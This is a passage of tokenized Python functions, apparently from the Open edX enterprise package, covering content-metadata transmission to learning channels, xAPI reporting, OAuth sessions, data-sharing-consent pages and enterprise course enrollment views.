def transmit ( self , payload , * * kwargs ) : items to create , items to update , items to delete , transmission map = self . partition items ( payload ) self . prepare items for delete ( items to delete ) prepared items = { } prepared items . update ( items to create ) prepared items . update ( items to update ) prepared items . update ( items to delete ) skip metadata transmission = False for chunk in chunks ( prepared items , self . enterprise configuration . transmission chunk size ) : chunked items = list ( chunk . values ( ) ) if skip metadata transmission : # Remove the failed items from the create/update/delete dictionaries, # so Content Metadata Item Transmission objects are not synchronized for # these items below. self . remove failed items ( chunked items , items to create , items to update , items to delete ) else : try : self . client . update content metadata ( self . serialize items ( chunked items ) ) except Client Error as exc : LOGGER . error ( 'Failed to update [%s] content metadata items for integrated channel [%s] [%s]' , len ( chunked items ) , self . enterprise configuration . enterprise customer . name , self . enterprise configuration . channel code , ) LOGGER . error ( exc ) # Remove the failed items from the create/update/delete dictionaries, # so Content Metadata Item Transmission objects are not synchronized for # these items below. self . remove failed items ( chunked items , items to create , items to update , items to delete ) # SAP servers throttle incoming traffic, If a request fails than the subsequent would fail too, # So, no need to keep trying and failing. We should stop here and retry later. skip metadata transmission = True self . create transmissions ( items to create ) self . update transmissions ( items to update , transmission map ) self . delete transmissions ( items to delete . keys ( ) )
def handle ( self , * args , * * options ) : if not Course Enrollment : raise Not Connected To Open Ed X ( "This package must be installed in an Open Ed X environment." ) days , enterprise customer = self . parse arguments ( * args , * * options ) if enterprise customer : try : lrs configuration = XAPILRS Configuration . objects . get ( active = True , enterprise customer = enterprise customer ) except XAPILRS Configuration . Does Not Exist : raise Command Error ( 'No x API Configuration found for "{enterprise customer}"' . format ( enterprise customer = enterprise customer . name ) ) # Send x API analytics data to the configured LRS self . send xapi statements ( lrs configuration , days ) else : for lrs configuration in XAPILRS Configuration . objects . filter ( active = True ) : self . send xapi statements ( lrs configuration , days )
def create session ( self , scope ) : now = datetime . datetime . utcnow ( ) if self . session is None or self . expires at is None or now >= self . expires at : # Create a new session with a valid token if self . session : self . session . close ( ) oauth access token , expires at = self . get oauth access token ( self . enterprise configuration . key , self . enterprise configuration . secret , self . enterprise configuration . degreed user id , self . enterprise configuration . degreed user password , scope ) session = requests . Session ( ) session . timeout = self . SESSION TIMEOUT session . headers [ 'Authorization' ] = 'Bearer {}' . format ( oauth access token ) session . headers [ 'content-type' ] = 'application/json' self . session = session self . expires at = expires at
def ensure data exists ( self , request , data , error message = None ) : if not data : error message = ( error message or "Unable to fetch API response from endpoint '{}'." . format ( request . get full path ( ) ) ) LOGGER . error ( error message ) raise Not Found ( error message )
def course enrollments ( self , request , pk ) : enterprise customer = self . get object ( ) serializer = serializers . Enterprise Customer Course Enrollments Serializer ( data = request . data , many = True , context = { 'enterprise customer' : enterprise customer , 'request user' : request . user , } ) if serializer . is valid ( ) : serializer . save ( ) return Response ( serializer . data , status = HTTP 200 OK ) return Response ( serializer . errors , status = HTTP 400 BAD REQUEST )
def with access to ( self , request , * args , * * kwargs ) : # pylint: disable=invalid-name,unused-argument self . queryset = self . queryset . order by ( 'name' ) enterprise id = self . request . query params . get ( 'enterprise id' , None ) enterprise slug = self . request . query params . get ( 'enterprise slug' , None ) enterprise name = self . request . query params . get ( 'search' , None ) if enterprise id is not None : self . queryset = self . queryset . filter ( uuid = enterprise id ) elif enterprise slug is not None : self . queryset = self . queryset . filter ( slug = enterprise slug ) elif enterprise name is not None : self . queryset = self . queryset . filter ( name icontains = enterprise name ) return self . list ( request , * args , * * kwargs )
def get missing params message ( self , parameter state ) : params = ', ' . join ( name for name , present in parameter state if not present ) return self . MISSING REQUIRED PARAMS MSG . format ( params )
def transform title ( self , content metadata item ) : title with locales = [ ] for locale in self . enterprise configuration . get locales ( ) : title with locales . append ( { 'locale' : locale , 'value' : content metadata item . get ( 'title' , '' ) } ) return title with locales
def transform description ( self , content metadata item ) : description with locales = [ ] for locale in self . enterprise configuration . get locales ( ) : description with locales . append ( { 'locale' : locale , 'value' : ( content metadata item . get ( 'full description' ) or content metadata item . get ( 'short description' ) or content metadata item . get ( 'title' , '' ) ) } ) return description with locales
def transform image ( self , content metadata item ) : image url = '' if content metadata item [ 'content type' ] in [ 'course' , 'program' ] : image url = content metadata item . get ( 'card image url' ) elif content metadata item [ 'content type' ] == 'courserun' : image url = content metadata item . get ( 'image url' ) return image url
def transform courserun title ( self , content metadata item ) : title = content metadata item . get ( 'title' ) or '' course run start = content metadata item . get ( 'start' ) if course run start : if course available for enrollment ( content metadata item ) : title += ' ({starts}: {:%B %Y})' . format ( parse lms api datetime ( course run start ) , starts = ( 'Starts' ) ) else : title += ' ({:%B %Y} - {enrollment closed})' . format ( parse lms api datetime ( course run start ) , enrollment closed = ( 'Enrollment Closed' ) ) title with locales = [ ] content metadata language code = transform language code ( content metadata item . get ( 'content language' , '' ) ) for locale in self . enterprise configuration . get locales ( default locale = content metadata language code ) : title with locales . append ( { 'locale' : locale , 'value' : title } ) return title with locales
def transform courserun description ( self , content metadata item ) : description with locales = [ ] content metadata language code = transform language code ( content metadata item . get ( 'content language' , '' ) ) for locale in self . enterprise configuration . get locales ( default locale = content metadata language code ) : description with locales . append ( { 'locale' : locale , 'value' : ( content metadata item [ 'full description' ] or content metadata item [ 'short description' ] or content metadata item [ 'title' ] or '' ) } ) return description with locales
def transform courserun schedule ( self , content metadata item ) : start = content metadata item . get ( 'start' ) or UNIX MIN DATE STRING end = content metadata item . get ( 'end' ) or UNIX MAX DATE STRING return [ { 'start Date' : parse datetime to epoch millis ( start ) , 'end Date' : parse datetime to epoch millis ( end ) , 'active' : current time is in interval ( start , end ) } ]
def get content id ( self , content metadata item ) : content id = content metadata item . get ( 'key' , '' ) if content metadata item [ 'content type' ] == 'program' : content id = content metadata item . get ( 'uuid' , '' ) return content id
def chunks ( dictionary , chunk size ) : iterable = iter ( dictionary ) for in range ( 0 , len ( dictionary ) , chunk size ) : yield { key : dictionary [ key ] for key in islice ( iterable , chunk size ) }
def get link by email ( self , user email ) : try : user = User . objects . get ( email = user email ) try : return self . get ( user id = user . id ) except Enterprise Customer User . Does Not Exist : pass except User . Does Not Exist : pass try : return Pending Enterprise Customer User . objects . get ( user email = user email ) except Pending Enterprise Customer User . Does Not Exist : pass return None
def enterprise customer uuid ( self ) : try : enterprise user = Enterprise Customer User . objects . get ( user id = self . user . id ) except Object Does Not Exist : LOGGER . warning ( 'User {} has a {} assignment but is not linked to an enterprise!' . format ( self . class , self . user . id ) ) return None except Multiple Objects Returned : LOGGER . warning ( 'User {} is linked to multiple enterprises, which is not yet supported!' . format ( self . user . id ) ) return None return str ( enterprise user . enterprise customer . uuid )
def export ( self ) : content metadata export = { } content metadata items = self . enterprise api . get content metadata ( self . enterprise customer ) LOGGER . info ( 'Retrieved content metadata for enterprise [%s]' , self . enterprise customer . name ) for item in content metadata items : transformed = self . transform item ( item ) LOGGER . info ( 'Exporting content metadata item with plugin configuration [%s]: [%s]' , self . enterprise configuration , json . dumps ( transformed , indent = 4 ) , ) content metadata item export = Content Metadata Item Export ( item , transformed ) content metadata export [ content metadata item export . content id ] = content metadata item export return Ordered Dict ( sorted ( content metadata export . items ( ) ) )
def transform item ( self , content metadata item ) : content metadata type = content metadata item [ 'content type' ] transformed item = { } for integrated channel schema key , edx data schema key in self . DATA TRANSFORM MAPPING . items ( ) : # Look for transformer functions defined on subclasses. # Favor content type-specific functions. transformer = ( getattr ( self , 'transform {content type} {edx data schema key}' . format ( content type = content metadata type , edx data schema key = edx data schema key ) , None ) or getattr ( self , 'transform {edx data schema key}' . format ( edx data schema key = edx data schema key ) , None ) ) if transformer : transformed item [ integrated channel schema key ] = transformer ( content metadata item ) else : # The concrete subclass does not define an override for the given field, # so just use the data key to index the content metadata item dictionary. try : transformed item [ integrated channel schema key ] = content metadata item [ edx data schema key ] except Key Error : # There may be a problem with the DATA TRANSFORM MAPPING on # the concrete subclass or the concrete subclass does not implement # the appropriate field tranformer function. LOGGER . exception ( 'Failed to transform content metadata item field [%s] for [%s]: [%s]' , edx data schema key , self . enterprise customer . name , content metadata item , ) return transformed item
def get consent record ( self , request ) : username , course id , program uuid , enterprise customer uuid = self . get required query params ( request ) return get data sharing consent ( username , enterprise customer uuid , course id = course id , program uuid = program uuid )
def get no record response ( self , request ) : username , course id , program uuid , enterprise customer uuid = self . get required query params ( request ) data = { self . REQUIRED PARAM USERNAME : username , self . REQUIRED PARAM ENTERPRISE CUSTOMER : enterprise customer uuid , self . CONSENT EXISTS : False , self . CONSENT GRANTED : False , self . CONSENT REQUIRED : False , } if course id : data [ self . REQUIRED PARAM COURSE ID ] = course id if program uuid : data [ self . REQUIRED PARAM PROGRAM UUID ] = program uuid return Response ( data , status = HTTP 200 OK )
def ready ( self ) : from enterprise . signals import handle user post save from django . db . models . signals import pre migrate , post save post save . connect ( handle user post save , sender = self . auth user model , dispatch uid = USER POST SAVE DISPATCH UID ) pre migrate . connect ( self . disconnect user post save for migrations )
def disconnect user post save for migrations ( self , sender , * * kwargs ) : # pylint: disable=unused-argument from django . db . models . signals import post save post save . disconnect ( sender = self . auth user model , dispatch uid = USER POST SAVE DISPATCH UID )
def get actor ( self , username , email ) : return Agent ( name = username , mbox = 'mailto:{email}' . format ( email = email ) , )
def get object ( self , name , description ) : return Activity ( id = X API ACTIVITY COURSE , definition = Activity Definition ( name = Language Map ( { 'en-US' : ( name or '' ) . encode ( "ascii" , "ignore" ) . decode ( 'ascii' ) } ) , description = Language Map ( { 'en-US' : ( description or '' ) . encode ( "ascii" , "ignore" ) . decode ( 'ascii' ) } ) , ) , )
def clean course ( self ) : course id = self . cleaned data [ self . Fields . COURSE ] . strip ( ) if not course id : return None try : client = Enrollment Api Client ( ) return client . get course details ( course id ) except ( Http Client Error , Http Server Error ) : raise Validation Error ( Validation Messages . INVALID COURSE ID . format ( course id = course id ) )
def clean notify ( self ) : return self . cleaned data . get ( self . Fields . NOTIFY , self . Notification Types . DEFAULT )
def validate course ( self ) : # Verify that the selected mode is valid for the given course . course details = self . cleaned data . get ( self . Fields . COURSE ) if course details : course mode = self . cleaned data . get ( self . Fields . COURSE MODE ) if not course mode : raise Validation Error ( Validation Messages . COURSE WITHOUT COURSE MODE ) valid course modes = course details [ "course modes" ] if all ( course mode != mode [ "slug" ] for mode in valid course modes ) : error = Validation Error ( Validation Messages . COURSE MODE INVALID FOR COURSE . format ( course mode = course mode , course id = course details [ "course id" ] , ) ) raise Validation Error ( { self . Fields . COURSE MODE : error } )
def validate program ( self ) : program = self . cleaned data . get ( self . Fields . PROGRAM ) if not program : return course runs = get course runs from program ( program ) try : client = Course Catalog Api Client ( self . user , self . enterprise customer . site ) available modes = client . get common course modes ( course runs ) course mode = self . cleaned data . get ( self . Fields . COURSE MODE ) except ( Http Client Error , Http Server Error ) : raise Validation Error ( Validation Messages . FAILED TO OBTAIN COURSE MODES . format ( program title = program . get ( "title" ) ) ) if not course mode : raise Validation Error ( Validation Messages . COURSE WITHOUT COURSE MODE ) if course mode not in available modes : raise Validation Error ( Validation Messages . COURSE MODE NOT AVAILABLE . format ( mode = course mode , program title = program . get ( "title" ) , modes = ", " . join ( available modes ) ) )
def clean ( self ) : cleaned data = super ( Enterprise Customer Reporting Config Admin Form , self ) . clean ( ) report customer = cleaned data . get ( 'enterprise customer' ) # Check that any selected catalogs are tied to the selected enterprise. invalid catalogs = [ '{} ({})' . format ( catalog . title , catalog . uuid ) for catalog in cleaned data . get ( 'enterprise customer catalogs' ) if catalog . enterprise customer != report customer ] if invalid catalogs : message = ( 'These catalogs for reporting do not match enterprise' 'customer {enterprise customer}: {invalid catalogs}' , ) . format ( enterprise customer = report customer , invalid catalogs = invalid catalogs , ) self . add error ( 'enterprise customer catalogs' , message )
def verify edx resources ( ) : required methods = { 'Program Data Extender' : Program Data Extender , } for method in required methods : if required methods [ method ] is None : raise Not Connected To Open Ed X ( ( "The following method from the Open ed X platform is necessary for this view but isn't available." ) + "\n Unavailable: {method}" . format ( method = method ) )
def get global context ( request , enterprise customer ) : platform name = get configuration value ( "PLATFORM NAME" , settings . PLATFORM NAME ) # pylint: disable=no-member return { 'enterprise customer' : enterprise customer , 'LMS SEGMENT KEY' : settings . LMS SEGMENT KEY , 'LANGUAGE CODE' : get language from request ( request ) , 'tagline' : get configuration value ( "ENTERPRISE TAGLINE" , settings . ENTERPRISE TAGLINE ) , 'platform description' : get configuration value ( "PLATFORM DESCRIPTION" , settings . PLATFORM DESCRIPTION , ) , 'LMS ROOT URL' : settings . LMS ROOT URL , 'platform name' : platform name , 'header logo alt text' : ( '{platform name} home page' ) . format ( platform name = platform name ) , 'welcome text' : constants . WELCOME TEXT . format ( platform name = platform name ) , 'enterprise welcome text' : constants . ENTERPRISE WELCOME TEXT . format ( enterprise customer name = enterprise customer . name , platform name = platform name , strong start = '<strong>' , strong end = '</strong>' , line break = '<br/>' , privacy policy link start = "<a href='{pp url}' target=' blank'>" . format ( pp url = get configuration value ( 'PRIVACY' , 'https://www.edx.org/edx-privacy-policy' , type = 'url' ) , ) , privacy policy link end = "</a>" , ) , }
def render page with error code message ( request , context data , error code , log message ) : LOGGER . error ( log message ) messages . add generic error message with code ( request , error code ) return render ( request , ENTERPRISE GENERAL ERROR PAGE , context = context data , status = 404 , )
def course or program exist ( self , course id , program uuid ) : course exists = course id and Course Api Client ( ) . get course details ( course id ) program exists = program uuid and Course Catalog Api Service Client ( ) . program exists ( program uuid ) return course exists or program exists
def get default context ( self , enterprise customer , platform name ) : context data = { 'page title' : ( 'Data sharing consent required' ) , 'consent message header' : ( 'Consent to share your data' ) , 'requested permissions header' : ( 'Per the {start link}Data Sharing Policy{end link}, ' '{bold start}{enterprise customer name}{bold end} would like to know about:' ) . format ( enterprise customer name = enterprise customer . name , bold start = '<b>' , bold end = '</b>' , start link = '<a href="#consent-policy-dropdown-bar" ' 'class="policy-dropdown-link background-input" id="policy-dropdown-link">' , end link = '</a>' , ) , 'agreement text' : ( 'I agree to allow {platform name} to share data about my enrollment, completion and performance in all ' '{platform name} courses and programs where my enrollment is sponsored by {enterprise customer name}.' ) . format ( enterprise customer name = enterprise customer . name , platform name = platform name , ) , 'continue text' : ( 'Yes, continue' ) , 'abort text' : ( 'No, take me back.' ) , 'policy dropdown header' : ( 'Data Sharing Policy' ) , 'sharable items header' : ( 'Enrollment, completion, and performance data that may be shared with {enterprise customer name} ' '(or its designee) for these courses and programs are limited to the following:' ) . format ( enterprise customer name = enterprise customer . name ) , 'sharable items' : [ ( 'My email address for my {platform name} account, ' 'and the date when I created my {platform name} account' ) . format ( platform name = platform name ) , ( 'My {platform name} ID, and if I log in via single sign-on, ' 'my {enterprise customer name} SSO user-ID' ) . format ( platform name = platform name , enterprise customer name = enterprise customer . name , ) , ( 'My {platform name} username' ) . format ( platform name = platform name ) , ( 'My country or region of residence' ) , ( 'What courses and/or programs I\'ve enrolled in or unenrolled from, what track I ' 'enrolled in (audit or verified) and the date when I enrolled in each course or program' ) , ( 'Information about each course or program I\'ve enrolled in, ' 'including its duration and level of effort required' ) , ( 'Whether I completed specific parts of each course or program (for example, whether ' 'I watched a given video or completed a given homework assignment)' ) , ( 'My overall percentage completion of each course or program on a periodic basis, ' 'including the total time spent in each course or program and the date when I last ' 'logged in to each course or program' ) , ( 'My performance in each course or program' ) , ( 'My final grade in each course or program, and the date when I completed each course or program' ) , ( 'Whether I received a certificate in each course or program' ) , ] , 'sharable items footer' : ( 'My permission applies only to data from courses or programs that are sponsored by ' '{enterprise customer name}, and not to data from any {platform name} courses or programs that ' 'I take on my own. I understand that I may withdraw my permission only by fully unenrolling ' 'from any courses or programs that are sponsored by {enterprise customer name}.' ) . format ( enterprise customer name = enterprise customer . name , platform name = platform name , ) , 'sharable items note header' : ( 'Please note' ) , 'sharable items notes' : [ ( 'If you decline to consent, that fact may be shared with {enterprise customer name}.' ) . format ( enterprise customer name = enterprise customer . name ) , ] , 'confirmation modal header' : ( 'Are you aware...' ) , 'confirmation modal affirm decline text' : ( 'I decline' ) , 'confirmation modal abort decline text' : ( 'View the data sharing policy' ) , 'policy link template' : ( 'View the {start link}data sharing policy{end link}.' ) . format ( start link = '<a href="#consent-policy-dropdown-bar" class="policy-dropdown-link background-input" ' 'id="policy-dropdown-link">' , end link = '</a>' , ) , 'policy return link text' : ( 'Return to Top' ) , } return context data
def get course or program context ( self , enterprise customer , course id = None , program uuid = None ) : context data = { } if course id : context data . update ( { 'course id' : course id , 'course specific' : True } ) if not self . preview mode : try : catalog api client = Course Catalog Api Service Client ( enterprise customer . site ) except Improperly Configured : raise Http404 course run details = catalog api client . get course run ( course id ) course start date = '' if course run details [ 'start' ] : course start date = parse ( course run details [ 'start' ] ) . strftime ( '%B %d, %Y' ) context data . update ( { 'course title' : course run details [ 'title' ] , 'course start date' : course start date , } ) else : context data . update ( { 'course title' : 'Demo Course' , 'course start date' : datetime . datetime . now ( ) . strftime ( '%B %d, %Y' ) , } ) else : context data . update ( { 'program uuid' : program uuid , 'program specific' : True , } ) return context data
def get ( self , request ) : enterprise customer uuid = request . GET . get ( 'enterprise customer uuid' ) success url = request . GET . get ( 'next' ) failure url = request . GET . get ( 'failure url' ) course id = request . GET . get ( 'course id' , '' ) program uuid = request . GET . get ( 'program uuid' , '' ) self . preview mode = bool ( request . GET . get ( 'preview mode' , False ) ) # Get enterprise customer to start in case we need to render a custom 404 page # Then go through other business logic to determine (and potentially overwrite) the enterprise customer enterprise customer = get enterprise customer or 404 ( enterprise customer uuid ) context data = get global context ( request , enterprise customer ) if not self . preview mode : if not self . course or program exist ( course id , program uuid ) : error code = 'ENTGDS000' log message = ( 'Neither the course with course id: {course id} ' 'or program with {program uuid} exist for ' 'enterprise customer {enterprise customer uuid}' 'Error code {error code} presented to user {userid}' . format ( course id = course id , program uuid = program uuid , error code = error code , userid = request . user . id , enterprise customer uuid = enterprise customer uuid , ) ) return render page with error code message ( request , context data , error code , log message ) try : consent record = get data sharing consent ( request . user . username , enterprise customer uuid , program uuid = program uuid , course id = course id ) except Not Connected To Open Ed X as error : error code = 'ENTGDS001' log message = ( 'The was a problem with getting the consent record of user {userid} with ' 'uuid {enterprise customer uuid}. get data sharing consent threw ' 'the following Not Connected To Open Ed X error: {error}' 'for course id {course id}.' 'Error code {error code} presented to user' . format ( userid = request . user . id , enterprise customer uuid = enterprise customer uuid , error = error , error code = error code , course id = course id , ) ) return render page with error code message ( request , context data , error code , log message ) try : consent required = consent record . consent required ( ) except Attribute Error : consent required = None if consent record is None or not consent required : error code = 'ENTGDS002' log message = ( 'The was a problem with the consent record of user {userid} with ' 'enterprise customer uuid {enterprise customer uuid}. consent record has a value ' 'of {consent record} and consent record.consent required() a ' 'value of {consent required} for course id {course id}. ' 'Error code {error code} presented to user' . format ( userid = request . user . id , enterprise customer uuid = enterprise customer uuid , consent record = consent record , consent required = consent required , error code = error code , course id = course id , ) ) return render page with error code message ( request , context data , error code , log message ) else : enterprise customer = consent record . enterprise customer elif not request . user . is staff : raise Permission Denied ( ) # Retrieve context data again now that enterprise customer logic has been run context data = get global context ( request , enterprise customer ) if not ( enterprise customer uuid and success url and failure url ) : error code = 'ENTGDS003' log message = ( 'Error: one or more of the following values was falsy: ' 'enterprise customer uuid: {enterprise customer uuid}, ' 'success url: {success url}, ' 'failure url: {failure url} for course id {course id}' 'The following error code was reported to user {userid}: {error code}' . format ( userid = request . user . id , enterprise customer uuid = enterprise customer uuid , success url = success url , failure url = failure url , error code = error code , course id = course id , ) ) return render page with error code message ( request , context data , error code , log message ) try : updated context dict = self . get course or program context ( enterprise customer , course id = course id , program uuid = program uuid ) context data . update ( updated context dict ) except Http404 : error code = 'ENTGDS004' log message = ( 'Course Catalog Api Service Client is improperly configured. ' 'Returned error code {error code} to user {userid} ' 'and enterprise customer {enterprise customer} ' 'for course id {course id}' . format ( error code = error code , userid = request . user . id , enterprise customer = enterprise customer . uuid , course id = course id , ) ) return render page with error code message ( request , context data , error code , log message ) item = 'course' if course id else 'program' # Translators: bold start and bold end are HTML tags for specifying enterprise name in bold text. context data . update ( { 'consent request prompt' : ( 'To access this {item}, you must first consent to share your learning achievements ' 'with {bold start}{enterprise customer name}{bold end}.' ) . format ( enterprise customer name = enterprise customer . name , bold start = '<b>' , bold end = '</b>' , item = item , ) , 'confirmation alert prompt' : ( 'In order to start this {item} and use your discount, {bold start}you must{bold end} consent ' 'to share your {item} data with {enterprise customer name}.' ) . format ( enterprise customer name = enterprise customer . name , bold start = '<b>' , bold end = '</b>' , item = item , ) , 'redirect url' : success url , 'failure url' : failure url , 'defer creation' : request . GET . get ( 'defer creation' ) is not None , 'requested permissions' : [ ( 'your enrollment in this {item}' ) . format ( item = item ) , ( 'your learning progress' ) , ( 'course completion' ) , ] , 'policy link template' : '' , } ) platform name = context data [ 'platform name' ] published only = False if self . preview mode else True enterprise consent page = enterprise customer . get data sharing consent text overrides ( published only = published only ) if enterprise consent page : context data . update ( self . get context from db ( enterprise consent page , platform name , item , context data ) ) else : context data . update ( self . get default context ( enterprise customer , platform name ) ) return render ( request , 'enterprise/grant data sharing permissions.html' , context = context data )
def post ( self , request ) : enterprise uuid = request . POST . get ( 'enterprise customer uuid' ) success url = request . POST . get ( 'redirect url' ) failure url = request . POST . get ( 'failure url' ) course id = request . POST . get ( 'course id' , '' ) program uuid = request . POST . get ( 'program uuid' , '' ) enterprise customer = get enterprise customer or 404 ( enterprise uuid ) context data = get global context ( request , enterprise customer ) if not ( enterprise uuid and success url and failure url ) : error code = 'ENTGDS005' log message = ( 'Error: one or more of the following values was falsy: ' 'enterprise uuid: {enterprise uuid}, ' 'success url: {success url}, ' 'failure url: {failure url} for course id {course id}. ' 'The following error code was reported to the user {userid}: {error code}' . format ( userid = request . user . id , enterprise uuid = enterprise uuid , success url = success url , failure url = failure url , error code = error code , course id = course id , ) ) return render page with error code message ( request , context data , error code , log message ) if not self . course or program exist ( course id , program uuid ) : error code = 'ENTGDS006' log message = ( 'Neither the course with course id: {course id} ' 'or program with {program uuid} exist for ' 'enterprise customer {enterprise uuid}' 'Error code {error code} presented to user {userid}' . format ( course id = course id , program uuid = program uuid , error code = error code , userid = request . user . id , enterprise uuid = enterprise uuid , ) ) return render page with error code message ( request , context data , error code , log message ) consent record = get data sharing consent ( request . user . username , enterprise uuid , program uuid = program uuid , course id = course id ) if consent record is None : error code = 'ENTGDS007' log message = ( 'The was a problem with the consent record of user {userid} with ' 'enterprise uuid {enterprise uuid}. consent record has a value ' 'of {consent record} and a ' 'value for course id {course id}. ' 'Error code {error code} presented to user' . format ( userid = request . user . id , enterprise uuid = enterprise uuid , consent record = consent record , error code = error code , course id = course id , ) ) return render page with error code message ( request , context data , error code , log message ) defer creation = request . POST . get ( 'defer creation' ) consent provided = bool ( request . POST . get ( 'data sharing consent' , False ) ) if defer creation is None and consent record . consent required ( ) : if course id : enterprise customer user , = Enterprise Customer User . objects . get or create ( enterprise customer = consent record . enterprise customer , user id = request . user . id ) enterprise customer user . update session ( request ) , created = Enterprise Course Enrollment . objects . get or create ( enterprise customer user = enterprise customer user , course id = course id , ) if created : track enrollment ( 'data-consent-page-enrollment' , request . user . id , course id , request . path ) consent record . granted = consent provided consent record . save ( ) return redirect ( success url if consent provided else failure url )
def set final prices ( self , modes , request ) : result = [ ] for mode in modes : if mode [ 'premium' ] : mode [ 'final price' ] = Ecommerce Api Client ( request . user ) . get course final price ( mode = mode , enterprise catalog uuid = request . GET . get ( 'catalog' ) if request . method == 'GET' else None , ) result . append ( mode ) return result
def get enterprise course enrollment page ( self , request , enterprise customer , course , course run , course modes , enterprise course enrollment , data sharing consent ) : context data = get global context ( request , enterprise customer ) enterprise catalog uuid = request . GET . get ( 'catalog' ) if request . method == 'GET' else None html template for rendering = ENTERPRISE GENERAL ERROR PAGE if course and course run : course enrollable = True course start date = '' course in future = False organization name = '' organization logo = '' expected learning items = course [ 'expected learning items' ] # Parse organization name and logo. if course [ 'owners' ] : # The owners key contains the organizations associated with the course. # We pick the first one in the list here to meet UX requirements. organization = course [ 'owners' ] [ 0 ] organization name = organization [ 'name' ] organization logo = organization [ 'logo image url' ] course title = course run [ 'title' ] course short description = course run [ 'short description' ] or '' course full description = clean html for template rendering ( course run [ 'full description' ] or '' ) course pacing = self . PACING FORMAT . get ( course run [ 'pacing type' ] , '' ) if course run [ 'start' ] : course start date = parse ( course run [ 'start' ] ) . strftime ( '%B %d, %Y' ) now = datetime . datetime . now ( pytz . UTC ) course in future = parse ( course run [ 'start' ] ) > now course level type = course run . get ( 'level type' , '' ) staff = course run [ 'staff' ] # Format the course effort string using the min/max effort fields for the course run. course effort = ungettext min max ( '{} hour per week' , '{} hours per week' , '{}-{} hours per week' , course run [ 'min effort' ] or None , course run [ 'max effort' ] or None , ) or '' # Parse course run image. course run image = course run [ 'image' ] or { } course image uri = course run image . get ( 'src' , '' ) # Retrieve the enterprise-discounted price from ecommerce. course modes = self . set final prices ( course modes , request ) premium modes = [ mode for mode in course modes if mode [ 'premium' ] ] # Filter audit course modes. course modes = filter audit course modes ( enterprise customer , course modes ) # Allows automatic assignment to a cohort upon enrollment. cohort = request . GET . get ( 'cohort' ) # Add a message to the message display queue if the learner # has gone through the data sharing consent flow and declined # to give data sharing consent. if enterprise course enrollment and not data sharing consent . granted : messages . add consent declined message ( request , enterprise customer , course run . get ( 'title' , '' ) ) if not is course run enrollable ( course run ) : messages . add unenrollable item message ( request , 'course' ) course enrollable = False context data . update ( { 'course enrollable' : course enrollable , 'course title' : course title , 'course short description' : course short description , 'course pacing' : course pacing , 'course start date' : course start date , 'course in future' : course in future , 'course image uri' : course image uri , 'course modes' : course modes , 'course effort' : course effort , 'course full description' : course full description , 'cohort' : cohort , 'organization logo' : organization logo , 'organization name' : organization name , 'course level type' : course level type , 'premium modes' : premium modes , 'expected learning items' : expected learning items , 'catalog' : enterprise catalog uuid , 'staff' : staff , 'discount text' : ( 'Discount provided by {strong start}{enterprise customer name}{strong end}' ) . format ( enterprise customer name = enterprise customer . name , strong start = '<strong>' , strong end = '</strong>' , ) , 'hide course original price' : enterprise customer . hide course original price } ) html template for rendering = 'enterprise/enterprise course enrollment page.html' context data . update ( { 'page title' : ( 'Confirm your course' ) , 'confirmation text' : ( 'Confirm your course' ) , 'starts at text' : ( 'Starts' ) , 'view course details text' : ( 'View Course Details' ) , 'select mode text' : ( 'Please select one:' ) , 'price text' : ( 'Price' ) , 'continue link text' : ( 'Continue' ) , 'level text' : ( 'Level' ) , 'effort text' : ( 'Effort' ) , 'close modal button text' : ( 'Close' ) , 'expected learning items text' : ( "What you'll learn" ) , 'course full description text' : ( 'About This Course' ) , 'staff text' : ( 'Course Staff' ) , } ) return render ( request , html template for rendering , context = context data )
def post ( self , request , enterprise uuid , course id ) : enterprise customer , course , course run , course modes = self . get base details ( request , enterprise uuid , course id ) # Create a link between the user and the enterprise customer if it does not already exist. enterprise customer user , = Enterprise Customer User . objects . get or create ( enterprise customer = enterprise customer , user id = request . user . id ) enterprise customer user . update session ( request ) data sharing consent = Data Sharing Consent . objects . proxied get ( username = enterprise customer user . username , course id = course id , enterprise customer = enterprise customer ) try : enterprise course enrollment = Enterprise Course Enrollment . objects . get ( enterprise customer user enterprise customer = enterprise customer , enterprise customer user user id = request . user . id , course id = course id ) except Enterprise Course Enrollment . Does Not Exist : enterprise course enrollment = None enterprise catalog uuid = request . POST . get ( 'catalog' ) selected course mode name = request . POST . get ( 'course mode' ) cohort name = request . POST . get ( 'cohort' ) selected course mode = None for course mode in course modes : if course mode [ 'mode' ] == selected course mode name : selected course mode = course mode break if not selected course mode : return self . get enterprise course enrollment page ( request , enterprise customer , course , course run , course modes , enterprise course enrollment , data sharing consent ) user consent needed = get data sharing consent ( enterprise customer user . username , enterprise customer . uuid , course id = course id ) . consent required ( ) if not selected course mode . get ( 'premium' ) and not user consent needed : # For the audit course modes (audit, honor), where DSC is not # required, enroll the learner directly through enrollment API # client and redirect the learner to LMS courseware page. if not enterprise course enrollment : # Create the Enterprise backend database records for this course enrollment. enterprise course enrollment = Enterprise Course Enrollment . objects . create ( enterprise customer user = enterprise customer user , course id = course id , ) track enrollment ( 'course-landing-page-enrollment' , request . user . id , course id , request . get full path ( ) ) client = Enrollment Api Client ( ) client . enroll user in course ( request . user . username , course id , selected course mode name , cohort = cohort name ) return redirect ( LMS COURSEWARE URL . format ( course id = course id ) ) if user consent needed : # For the audit course modes (audit, honor) or for the premium # course modes (Verified, Prof Ed) where DSC is required, redirect # the learner to course specific DSC with enterprise UUID from # there the learner will be directed to the ecommerce flow after # providing DSC. query string params = { 'course mode' : selected course mode name , } if enterprise catalog uuid : query string params . update ( { 'catalog' : enterprise catalog uuid } ) next url = '{handle consent enrollment url}?{query string}' . format ( handle consent enrollment url = reverse ( 'enterprise handle consent enrollment' , args = [ enterprise customer . uuid , course id ] ) , query string = urlencode ( query string params ) ) failure url = reverse ( 'enterprise course run enrollment page' , args = [ enterprise customer . uuid , course id ] ) if request . META [ 'QUERY STRING' ] : # Preserve all querystring parameters in the request to build # failure url, so that learner views the same enterprise course # enrollment page (after redirect) as for the first time. # Since this is a POST view so use `request.META` to get # querystring instead of `request.GET`. # https://docs.djangoproject.com/en/1.11/ref/request-response/#django.http.Http Request.META failure url = '{course enrollment url}?{query string}' . format ( course enrollment url = reverse ( 'enterprise course run enrollment page' , args = [ enterprise customer . uuid , course id ] ) , query string = request . META [ 'QUERY STRING' ] ) return redirect ( '{grant data sharing url}?{params}' . format ( grant data sharing url = reverse ( 'grant data sharing permissions' ) , params = urlencode ( { 'next' : next url , 'failure url' : failure url , 'enterprise customer uuid' : enterprise customer . uuid , 'course id' : course id , } ) ) ) # For the premium course modes (Verified, Prof Ed) where DSC is # not required, redirect the enterprise learner to the ecommerce # flow in LMS. # Note: LMS start flow automatically detects the paid mode premium flow = LMS START 